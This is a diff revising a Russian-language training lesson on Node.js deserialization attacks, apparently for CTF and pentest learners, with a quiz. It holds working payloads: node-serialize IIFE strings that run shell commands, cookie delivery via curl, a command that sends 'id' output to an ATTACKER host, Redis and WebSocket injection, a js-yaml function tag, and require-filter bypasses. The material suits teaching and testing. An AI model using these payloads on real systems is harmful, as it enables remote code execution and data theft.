@@ -14,298 +14,213 @@ useful_for:
 estimated_minutes: 34
 summary: "Node.js-десериализация: node-serialize IIFE gadget, funcster, serialize-javascript и цепочки до RCE."
 ---
-Node.js-десериализация — редкий, но крайне разрушительный вектор. Проблема в том, что некоторые Node-библиотеки сериализуют в JSON **не только данные, но и функции**: при десериализации они вызывают `eval` над строкой, помеченной специальным префиксом. Классический пример — библиотека **node-serialize**, где поле с префиксом `_$$ND_FUNC$$_` превращается в реальную функцию через `eval`. Если добавить к функции немедленный вызов (IIFE), десериализация `JSON.parse`-подобного ввода приводит к RCE.
 
-## Теория: node-serialize и IIFE gadget
+## Вопрос, с которого всё начинается
 
-`node-serialize` — npm-пакет для сериализации объектов с поддержкой функций. При `serialize(obj)` функции кодируются как строки с префиксом:
+Обычный JSON в Node.js безопасен: `JSON.parse` умеет читать только данные — строки, числа, списки — и не может ничего выполнить. Так почему Node-десериализация вообще существует?
 
-```text
-_$$ND_FUNC$$_function(){ ... }
-```
+Потому что некоторые библиотеки сериализуют **не только данные, но и функции**. При десериализации они берут строку, помеченную специальным префиксом, и пропускают её через `eval` — то есть **выполняют**. Если такая строка попадёт в поле, которое приложение десериализует, ты получишь RCE. Разберём это на одном примере.
 
-При `unserialize()` библиотека находит этот префикс, берёт строку после него и вызывает `eval(...)`, получая функцию. Сама по себе функция ещё не выполняется — но если строка заканчивается вызовом `()` (IIFE, Immediately Invoked Function Expression), то `eval` **сразу выполняет** тело:
+## Наш пример
 
-```text
-_$$ND_FUNC$$_function(){ require('child_process').exec('id', function(e,o){ console.log(o) }); }()
-```
-
-Именно поэтому в payload нужен `()` в конце — без него функция лишь создастся, но не выполнится.
-
-## Формат сериализованного объекта
-
-Сериализованный объект — обычный JSON, где значение-функция представлена строкой с префиксом:
-
-```json
-{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('id',function(e,o){console.log(o)}); }()"}
-```
-
-Внешне это валидный JSON, поэтому фильтры «только JSON» его пропускают. Признак в трафике — подстрока `_$$ND_FUNC$$_` или `$$ND_FUNC$$`.
-
-## Разобранный пример: cookie → RCE
-
-Цель: приложение делает `unserialize(cookie)` через node-serialize.
-
-Шаг 1 — формируем payload:
+Есть Node-приложение `store.example`. Оно ставит cookie, который декодируется в JSON:
 
 ```bash
-PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\",function(e,o){console.log(o)});}()"}'
-echo -n "$PAYLOAD" | base64 -w0
+$ echo 'eyJwcm9maWxlIjp7Im5hbWUiOiJib2IifX0=' | base64 -d
+{"profile":{"name":"bob"}}
 ```
 
-Шаг 2 — отправляем cookie (base64 или url-encoded, как ждёт приложение):
+Обычный JSON — на первый взгляд безопасно. Но библиотека `node-serialize` кодирует функции особым префиксом `_$$ND_FUNC$$_`. Проверим гипотезу: отправим вместо `bob` строку, которая начинается с этого префикса и содержит безобидный `console.log`:
 
 ```bash
-curl -s https://app.example/ -H "Cookie: profile=$(echo -n "$PAYLOAD" | base64 -w0)"
+$ PAYLOAD='{"profile":"_$$ND_FUNC$$_function(){console.log(\"PWN\")}()"}'
+$ echo -n "$PAYLOAD" | base64 -w0
+eyJwcm9maWxlIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCl7Y29uc29sZS5sb2coIlBXTiIpfSgpIn0=
+$ curl -s https://store.example/ -H "Cookie: profile=$(echo -n "$PAYLOAD" | base64 -w0)"
 ```
 
-Шаг 3 — вывод функции не возвращается в ответ, поэтому доказываем RCE через OOB или файл-маркер:
+В логах сервера появляется `PWN` — значит, `unserialize` действительно **выполнил** нашу функцию. Внешне это был валидный JSON, поэтому фильтр «только JSON» его пропустил.
+
+## Шаг 1: почему нужен IIFE
+
+Обрати внимание на `()` в самом конце payload: `...function(){...}()`. Это **IIFE** (Immediately Invoked Function Expression — функция, вызываемая сразу после определения). Библиотека делает примерно так:
+
+```javascript
+eval('function(){ console.log("PWN") }')   // функция создана, но НЕ вызвана
+eval('function(){ console.log("PWN") }()') // функция создана И вызвана
+```
+
+Без `()` `eval` лишь создаст функцию и выбросит её — ничего не выполнится. С `()` — тело выполняется немедленно. Это самая частая ошибка новичка: payload вроде правильный, а эффекта нет, потому что забыт вызов.
+
+## Шаг 2: подтверждаем RCE
+
+Теперь заменим `console.log` на запуск процесса. Модуль `child_process` умеет выполнять команды ОС:
 
 ```bash
-PAYLOAD='{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\");}()"}'
+$ PAYLOAD='{"profile":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl http://ATTACKER:8080/$(id|base64)\");}()"}'
+$ python3 -m http.server 8080 &     # наш listener
+$ curl -s https://store.example/ -H "Cookie: profile=$(echo -n "$PAYLOAD" | base64 -w0)"
+# в логе: GET /dWlkPTAocm9vdCkK
 ```
 
-## Разобранный пример: RCE через Redis-кеш
-
-Если приложение кеширует объекты в Redis и читает их как node-serialize, а Redis доступен без пароля (частая misconfiguration):
+Пришёл запрос с base64 от `id=0(root)` — код выполнен. Вывод `exec` **не возвращается** в HTTP-ответ, поэтому доказательство всегда строится через OOB (DNS/HTTP) или файл-маркер:
 
 ```bash
-# записываем вредоносный объект в ключ, который приложение потом читает
-redis-cli -h TARGET SET cache:profile \
-  '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\");}()"}'
+$ PAYLOAD='{"profile":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id > /tmp/pwned\");}()"}'
 ```
 
-При следующем чтении ключа приложение десериализует объект → RCE. Это типовой путь «SSRF/открытый Redis → десериализация → RCE».
+Файл `/tmp/pwned` потом читаешь любой файловой уязвимостью — это тоже read-back.
 
-## Другие уязвимые библиотеки
+## Шаг 3: если `require` заблокирован
 
-- **`funcster`** — поддерживает `deepDeserialize`, также исполняет функции через `eval`/`new Function`.
-- **`serialize-javascript`** — при `unsafe`-режиме может вставлять исполняемый код; опасна при десериализации через `eval`.
-- **`cryo`** — в старых версиях исполняла функции.
-- **`node-serialize` до 0.0.4** — самая известная CVE (RCE через IIFE).
+Иногда `require` переименован или запрещён. Обойти можно через уже существующий глобальный `process`:
 
-Признаки: в `package.json` есть `node-serialize`, `funcster`, `cryo`; в трафике — `_$$ND_FUNC$$_` или `$$ND_FUNC$$`.
-
-## Обходы и тонкости
-
-- **`require` недоступен** (переименован/заблокирован) — используйте `process.mainModule.require` или `global.process.mainModule.require`, либо `this.constructor.constructor('return process')()`.
-- **Фильтр по `require`** — обходится через `child_process` без прямого `require`: `process.binding`, `global.process`, динамический `require` из `module`.
-- **Фильтр по `_$$ND_FUNC$$_`** — попробуйте `$$ND_FUNC$$`, юникод-экранирование, регистр (если фильтр регистрозависим).
-- **`eval` отключён** (--disallow-code-generation-from-strings) — вектор закрыт; тогда ищите другие библиотеки.
-- **Ограничение длины cookie** — используйте тело запроса или заголовок, а не cookie.
-
-## Где искать точки десериализации
-
-- Cookie/параметры, которые прогоняются через `node-serialize.unserialize`.
-- Redis/Memcached/queue, где объекты хранятся в формате node-serialize.
-- WebSocket-сообщения с сериализованными объектами.
-- Конфиги/сессии, где используется `funcster`/`cryo`.
-- Признаки в ответе: `SyntaxError` из `eval`, стек-трейсы `node-serialize`, `unserialize`.
-
-Поиск по исходникам:
-
-```bash
-grep -rn "node-serialize\|funcster\|cryo\|unserialize\|serialize-javascript" . --include='*.js'
+```javascript
+_$$ND_FUNC$$_function(){process.mainModule.require('child_process').exec('id > /tmp/pwned')}()
 ```
 
-## Инструменты
+Если и это не сработало — `global.process.mainModule.require(...)`, либо трюк с `this.constructor.constructor('return process')()`. Смысл один: добраться до функции, которая создаёт процесс, в обход фильтра.
 
-- **curl / Burp Repeater** — доставка payload.
-- **`base64`** — кодирование cookie.
-- **npm audit / grep** — поиск уязвимых зависимостей.
-- **`node -e`** — локальная проверка payload перед доставкой:
+## Шаг 4: другие уязвимые библиотеки и точки
 
-```bash
-node -e 'const s=require("node-serialize"); s.unserialize(process.argv[1])' \
-  '{"rce":"_$$ND_FUNC$$_function(){console.log(1)}()"}'
-```
-
-## Защита и почему она часто не работает
-
-Правильно: не использовать `node-serialize`/`funcster` для недоверенного ввода; применять чистый `JSON.parse` (он **не** исполняет функции); не хранить сериализованные объекты в cookie. Часто «защита» сводится к `JSON.parse`, но приложение всё равно вызывает `unserialize` для совместимости, или фильтр проверяет только начало строки.
-
-## Частые ошибки
-
-- **Забыть `()` в конце.** Без IIFE функция не выполнится.
-- **Неверная кодировка.** Cookie может ждать base64, url-encode или raw.
-- **Ждать stdout.** `exec` не пишет в ответ — используйте OOB/файл.
-- **Игнорировать `require`-фильтр.** Используйте `process.mainModule.require`.
-- **Путать с Java/PHP-deser.** Здесь JSON и `eval`, а не бинарь.
-- **Ломать прод.** RCE — только с согласия.
-
-## Что дальше / решение
-
-1. Нашли `_$$ND_FUNC$$_`/`$$ND_FUNC$$` → подтвердите, что `unserialize` исполняет функции (тест с `console.log`).
-2. IIFE не срабатывает → проверьте наличие `()` и корректность кодировки.
-3. `require` заблокирован → обойдите через `process.mainModule.require`.
-4. RCE подтверждён → устойчивый канал + read-back.
-5. Тупик → ищите Redis/queue-путь или другую библиотеку.
-
-## Справочная таблица
-
-| Признак | Значение | Действие |
-|---------|----------|----------|
-| `_$$ND_FUNC$$_` | node-serialize функция | добавить IIFE `()` |
-| `$$ND_FUNC$$` | вариант префикса | тот же payload |
-| `funcster` в package.json | уязвимая библиотека | `deepDeserialize` |
-| `require` blocked | фильтр | `process.mainModule.require` |
-| Redis без auth | кеш-объект | записать payload |
-| `SyntaxError` из eval | deser есть | подобрать payload |
-## Разобранный пример: WebSocket-сообщение с node-serialize
-
-Многие Node-приложения принимают команды по WebSocket и десериализуют их тем же `unserialize`. Это удобная точка, потому что WebSocket часто не покрыт WAF и логированием.
-
-```bash
-# простой клиент на node с ws
-node - <<'EOF'
-const WebSocket = require('ws');
-const ws = new WebSocket('wss://app.example/ws');
-ws.on('open', () => {
-  const payload = JSON.stringify({
-    action: "_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/ws_pwned');}()"
-  });
-  ws.send(payload);
-});
-EOF
-```
-
-Если после отправки файл `/tmp/ws_pwned` появился (проверяется через любой LFI), десериализация исполняет код. WebSocket-точки особенно ценны на CTF, где основной HTTP-вход защищён.
-
-## Пошаговый чек-лист
-
-1. **Инвентаризация зависимостей.** `cat package.json`, `npm ls node-serialize funcster cryo serialize-javascript`.
-2. **Поиск sink.** `grep -rn "unserialize\|deepDeserialize\|new Function\|eval(" . --include='*.js'`.
-3. **Детект формата.** В трафике ищите `_$$ND_FUNC$$_`/`$$ND_FUNC$$`; декодируйте base64.
-4. **Тест-подтверждение.** Payload с безобидным `console.log('PWN')` — убедиться, что `eval` вызывается.
-5. **RCE-подтверждение.** `exec('id')` с записью в файл или OOB DNS/HTTP-запросом.
-6. **Обход фильтров.** `process.mainModule.require` при блокировке `require`; смена кодировки/регистра префикса.
-7. **Эскалация.** Redis/queue-путь, если есть доступ к хранилищу.
-8. **Доказательство.** Read-back результата через тот же или смежный канал.
-
-## Взаимодействие со смежными темами
-
-- **`web-prototype-pollution-rce`** — второй классический путь к RCE в Node: загрязнение прототипа до `child_process`. Часто комбинируется с десериализацией, если библиотека использует `merge`/`assign`.
-- **`web-ssrf-*`** — доступ к внутреннему Redis, где лежат сериализованные объекты.
-- **`web-deserialization`** — общая теория форматов.
-- **`web-nodejs-injection`** — другие Node-инъекции (шаблоны, `child_process` напрямую).
-
-Практика: в Node-приложении почти всегда выгодно проверить сразу три вектора — deser (`node-serialize`), prototype pollution и SSTI в шаблонизаторе (EJS/Pug/Handlebars).
-
-## Расширенный список уязвимых библиотек и версий
+`node-serialize` — самый известный пример, но не единственный:
 
 | Библиотека | Опасность | Условие |
-|-----------|-----------|---------|
-| `node-serialize` | RCE через `_$$ND_FUNC$$_` | любой `unserialize` недоверенного ввода |
+|------------|-----------|---------|
+| `node-serialize` | RCE через `_$$ND_FUNC$$_` | `unserialize` недоверенного ввода |
 | `funcster` | RCE через `deepDeserialize` | исполнение функций |
 | `cryo` | RCE в старых версиях | десериализация |
-| `serialize-javascript` | XSS/RCE в `unsafe` | `eval` результата |
-| `node-yaml` (старый) | RCE через `!!js/function` | `load` без `safeLoad` |
-| `js-yaml` < 3.13 | RCE через `!!js/function` | `load` (не `safeLoad`) |
+| `js-yaml` < 3.13 | RCE через `!!js/function` | `load` без `safeLoad` |
 
-Особенно стоит проверить `js-yaml` — он массово используется в конфигах, и старые версии позволяют `!!js/function` с `eval`. Payload:
+`js-yaml` особенно коварен, потому что используется в конфигах повсюду. Payload:
 
 ```yaml
 !!js/function >
   function(){ require('child_process').execSync('id'); }
 ```
 
-## Как отличить node-deser от prototype pollution
+Точки, где стоит искать `unserialize`:
 
-- **node-deser** — ввод содержит префикс функции (`_$$ND_FUNC$$_`) и десериализуется целиком.
-- **prototype pollution** — ввод задаёт `__proto__`/`constructor.prototype`, и уязвимость проявляется позже, в другом месте (например, при создании процесса).
-- Иногда они совмещаются: десериализация загрязняет прототип, который затем используется sink-ом.
+- cookie/параметры, прогоняемые через `node-serialize.unserialize`;
+- WebSocket-сообщения с сериализованными объектами (часто вне WAF и логирования);
+- Redis/Memcached/очередь, где объекты хранятся в этом формате;
+- конфиги, где используется `funcster`/`cryo`.
 
-Диагностика: если payload без префикса функции всё равно меняет поведение (`__proto__`), это pollution; если нужен `_$$ND_FUNC$$_` — deser.
+Поиск по исходникам — дешёвая и очень эффективная проверка:
 
-## Верификация и доказательство
+```bash
+$ grep -rn "node-serialize\|funcster\|cryo\|unserialize\|serialize-javascript" . --include='*.js'
+$ npm ls node-serialize funcster cryo serialize-javascript
+```
 
-RCE в Node почти всегда «слепой» для HTTP-ответа. Надёжные способы доказать:
+## Шаг 5: через Redis — типовой путь
 
-1. **OOB DNS/HTTP** — `exec('curl http://UNIQUE.attacker')` и наблюдение запроса.
-2. **Файл-маркер + LFI** — записать `/tmp/<unique>` и прочитать через любую файловую уязвимость.
-3. **Reverse shell** — устойчивое доказательство, но шумно.
+Если приложение кеширует объекты в Redis и читает их через `node-serialize`, а Redis доступен без пароля (частая ошибка конфигурации), путь такой:
 
-Никогда не отмечайте RCE подтверждённым, не увидев read-back (DNS-запрос/файл/шелл). «Payload отправлен» ≠ «код выполнился».
-## Сравнение с другими языками десериализации
+```bash
+$ redis-cli -h TARGET SET cache:profile \
+  '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\");}()"}'
+```
 
-Чтобы не путать векторы, держите в голове таблицу:
+При следующем чтении ключа приложение десериализует объект — и выполнит код. Это классическая связка «открытый Redis (или SSRF → Redis) → десериализация → RCE».
 
-| Язык | Формат | Признак | Инструмент |
-|------|--------|---------|------------|
-| Node.js | JSON + `eval` | `_$$ND_FUNC$$_` | ручной payload |
-| PHP | сериализация | `O:` / `a:` | phpggc |
-| Java | бинарь | `AC ED 00 05` (`rO0AB`) | ysoserial |
-| Ruby | Marshal/YAML | `BAh` / `!ruby/object:` | universal gadget |
-| Python | pickle | `\x80\x04` (protocol 4) | ручной pickle |
+## Шаг 6: не спутать с prototype pollution
 
-Общее правило: сначала определите формат по байтам/префиксу, затем подберите генератор. Нельзя «скормить» PHP-payload Java-приложению — разные форматы и разные точки входа.
+Есть похожая, но другая атака — **prototype pollution**: ввод задаёт `__proto__`/`constructor.prototype`, и уязвимость проявляется позже, в другом месте (например, при создании процесса). Отличить просто:
 
-## Почему node-deser так редок, но так важен
+- **node-deser** — нужен префикс функции `_$$ND_FUNC$$_`, объект десериализуется целиком;
+- **prototype pollution** — payload без префикса функции всё равно меняет поведение через `__proto__`.
 
-`JSON.parse` в Node **не** исполняет функции — поэтому «нормальный» JSON-API неуязвим. Уязвимость появляется только там, где разработчик сознательно взял библиотеку с поддержкой функций (`node-serialize`, `funcster`, `cryo`) или включил `unsafe`-режим. Такие библиотеки встречаются редко, но:
+Иногда они совмещаются: десериализация загрязняет прототип, который затем использует sink.
 
-- когда встречаются — RCE гарантирован (это by design библиотеки);
-- часто прячутся в старом коде/зависимостях, которые никто не проверял;
-- на CTF специально выкладывают приложение с `node-serialize`, чтобы показать вектор.
+## Шаг 7: десериализация в WebSocket-сообщении
 
-Поэтому при аудите Node-приложения первым делом смотрите `package.json` и `npm ls` на предмет этих пакетов — это дешёвая проверка с огромным потенциалом.
+Многие Node-приложения принимают команды по **WebSocket** — постоянному двустороннему соединению — и десериализуют их тем же `unserialize`. Это удобная точка, потому что WebSocket часто не покрыт ни WAF, ни логированием: HTTP-фильтры видят только рукопожатие, а дальше идёт поток кадров.
 
-## Что делать, если node-serialize не найден
+```bash
+$ node - <<'EOF'
+const WebSocket = require('ws');
+const ws = new WebSocket('wss://store.example/ws');
+ws.on('open', () => {
+  ws.send(JSON.stringify({
+    action: "_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/ws_pwned');}()"
+  }));
+});
+EOF
+```
 
-Не сдавайтесь сразу — проверьте соседние Node-векторы, которые дают тот же результат:
+Если после отправки на сервере появился `/tmp/ws_pwned` (проверяется любой файловой уязвимостью или read-back), десериализация исполнила код. На CTF WebSocket-точки особенно ценны, когда основной HTTP-вход защищён: то, что закрыто на одном канале, часто открыто на другом. Всегда проверяй, не обрабатывает ли приложение сериализованные объекты и по WebSocket, и по HTTP — правила там разные.
 
-1. **Prototype pollution → RCE** — загрязните `__proto__` и дождитесь `child_process.spawn`/`fork` (`web-prototype-pollution-rce`).
-2. **SSTI** — EJS/Pug/Handlebars с `render` от пользователя → RCE (`web-ssti-*`).
-3. **`child_process` напрямую** — command injection в параметре, уходящем в `exec` (`web-command-injection`).
-4. **`js-yaml` old** — `!!js/function` при `load` без `safeLoad`.
-5. **Redis/queue** — если есть доступ к хранилищу с сериализованными объектами.
+## Что мы теперь знаем
 
-Так вы покрываете всю «Node-RCE-поверхность», а не только один пакет.
+- Обычный `JSON.parse` безопасен — он не исполняет функции.
+- `node-serialize` кодирует функции префиксом `_$$ND_FUNC$$_` и выполняет их через `eval`.
+- В payload обязателен IIFE — вызов `()` в конце, иначе функция не запустится.
+- RCE подтверждают через OOB или файл-маркер: вывод `exec` не идёт в ответ.
+- Если `require` заблокирован — `process.mainModule.require`.
+- Проверять надо `package.json`/`npm ls` и точки десериализации (cookie, WebSocket, Redis).
+- `js-yaml` со старым `load` даёт RCE через `!!js/function`.
+
+## На что смотреть дальше
+
+- **Первым делом смотри `package.json`** на `node-serialize`/`funcster`/`cryo` — дешёвая проверка с огромным потенциалом.
+- **Проверяй версию `js-yaml`**: старые сборки (`< 3.13`) исполняют `!!js/function` при обычном `load`, а этот пакет стоит почти в каждом Node-проекте.
+- **Не забудь `()`** — без IIFE payload бесполезен.
+- **Кодировка важна:** cookie может ждать base64, url-encode или raw.
+- **WebSocket** часто не покрыт WAF — отдельная удобная точка.
+- **Если node-serialize нет**, проверь соседние Node-векторы: prototype pollution, SSTI (EJS/Pug), command injection.
+- **Только с согласия.** RCE меняет состояние прода.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Какой префикс обозначает функцию в node-serialize?"
   options:
-    - "function:"
-    - "_$$ND_FUNC$$_"
-    - "@func"
-    - "=>"
+    - "`function:`"
+    - "`_$$ND_FUNC$$_`"
+    - "`@func`"
+    - "`=>`"
   answer: 1
   explanation: "Специальный маркер сериализованной функции."
-- question: "Почему нужен IIFE в payload?"
+- question: "Зачем в payload нужен IIFE (`()` в конце)?"
   options:
     - "Для красоты"
-    - "Чтобы функция выполнилась немедленно при десериализации"
+    - "Чтобы функция выполнилась сразу при десериализации, а не просто определилась"
     - "Для TLS"
-    - "Для cookie"
+    - "Для сжатия"
   answer: 1
-  explanation: "Без () она только определяется."
-- question: "Как вызвать child_process, если require недоступен?"
+  explanation: "Без `()` `eval` только создаст функцию и выбросит её."
+- question: "Как вызвать child_process, если `require` недоступен?"
   options:
-    - "import"
-    - "process.mainModule.require('child_process')"
-    - "eval"
-    - "fs"
+    - "Через `import`"
+    - "Через `process.mainModule.require('child_process')`"
+    - "Через `eval`"
+    - "Через `fs`"
   answer: 1
-  explanation: "Доступ через process."
-- question: "Какая ещё Node-библиотека поддерживает функции?"
+  explanation: "Доступ к require через глобальный process."
+- question: "Почему RCE в Node доказывают через OOB или файл?"
   options:
-    - "express"
-    - "funcster"
-    - "axios"
-    - "lodash"
+    - "Потому что это быстрее"
+    - "Вывод `exec` не возвращается в HTTP-ответ — канал слепой"
+    - "Потому что WAF"
+    - "Потому что JSON"
   answer: 1
-  explanation: "funcster использует new Function."
-- question: "Где чаще всего встречается node-deser?"
+  explanation: "exec не пишет в ответ, поэтому нужен внешний признак выполнения."
+- question: "Чем node-deser отличается от prototype pollution?"
   options:
-    - "В HTML"
-    - "В cookies/кеше/RPC с сериализованными объектами"
-    - "В TLS"
-    - "В DNS"
+    - "Ничем"
+    - "node-deser требует префикс функции `_$$ND_FUNC$$_`; pollution действует через `__proto__`"
+    - "pollution быстрее"
+    - "node-deser только в Python"
   answer: 1
-  explanation: "Точки десериализации Node."
+  explanation: "Разные механизмы: десериализация функции против загрязнения прототипа."
 ```
+
+## Куда дальше
+
+Дальше мы посмотрим, как то же самое выглядит в **Ruby** (`web-ruby-deser`) — там десериализация идёт через `Marshal` и YAML-теги `!ruby/object:`. А пока главное запомни: в Node есть библиотеки, которые **исполняют** сериализованные функции — и `package.json` подскажет, есть ли такая у цели.
 
 ## Где пригодится
 
